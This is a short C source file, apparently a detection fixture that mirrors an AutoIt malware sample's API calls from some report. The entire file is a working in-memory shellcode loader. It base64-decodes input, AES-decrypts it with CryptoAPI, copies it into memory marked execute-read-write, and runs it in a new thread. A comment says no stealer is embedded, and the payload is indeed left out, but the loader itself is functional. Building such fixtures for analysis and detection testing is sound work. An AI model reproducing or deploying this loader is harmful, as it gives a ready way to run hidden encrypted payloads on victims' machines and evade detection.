#include <windows.h>
#include <wincrypt.h>
#include <string.h>
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "crypt32.lib")
/* Representative native equivalent of the report's AutoIt API sequence.
   The fixture accepts key and ciphertext material; no stealer is embedded. */
int stage(const char *encoded, const BYTE *key_blob, DWORD key_length) {
    DWORD length = 0;
    HCRYPTPROV provider = 0;
    HCRYPTKEY key = 0;
    if (!CryptStringToBinaryA(encoded, 0, CRYPT_STRING_BASE64, NULL, &length, NULL, NULL)) return 1;
    BYTE *buffer = (BYTE *)HeapAlloc(GetProcessHeap(), 0, length);
    if (!buffer) return 2;
    if (!CryptStringToBinaryA(encoded, 0, CRYPT_STRING_BASE64, buffer, &length, NULL, NULL)) return 3;
    if (!CryptAcquireContextW(&provider, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) return 4;
    if (!CryptImportKey(provider, key_blob, key_length, 0, 0, &key)) return 5;
    if (!CryptDecrypt(key, 0, TRUE, 0, buffer, &length)) return 6;
    void *memory = VirtualAlloc(NULL, length, 0x3000, 0x40);
    if (!memory) return 7;
    memcpy(memory, buffer, length);
    HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)memory, NULL, 0, NULL);
    if (thread) { WaitForSingleObject(thread, INFINITE); CloseHandle(thread); }
    CryptDestroyKey(key);
    CryptReleaseContext(provider, 0);
    HeapFree(GetProcessHeap(), 0, buffer);
    return thread ? 0 : 8;
}
